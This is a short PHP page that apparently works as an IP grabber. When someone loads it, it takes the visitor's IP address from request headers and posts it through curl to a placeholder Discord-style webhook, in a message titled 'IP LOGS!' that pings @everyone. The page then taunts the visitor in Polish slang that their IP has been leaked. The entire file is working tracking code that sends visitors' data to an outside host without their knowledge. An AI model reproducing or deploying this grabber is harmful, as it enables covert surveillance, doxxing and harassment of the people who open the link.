<?php
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

function send_webhook_log($ip) {
    $webhookurl = "___PUT_YOUR_WEBHOOK_HERE___";


$json_data = json_encode([
    "content" => "@everyone",
    
    "username" => "IP LOGS!",

    "tts" => false,

    "embeds" => [
        [
            "title" => "Success!",

            "type" => "rich",

            "description" => "IP: $ip",

            "color" => hexdec( "3366ff" )
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


$ch = curl_init( $webhookurl );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

$response = curl_exec( $ch );
// If you need to debug, or find out why you can't send message uncomment line below, and execute script.
// echo $response;
curl_close( $ch );
}

send_webhook_log($ip);

?>

<html>
    <head>
        <title>acha</title>
    </head>
    <body>
        Acha twoje ip zostalo likniete lol ez za 0 pyrra yalla.
    </body>
</html>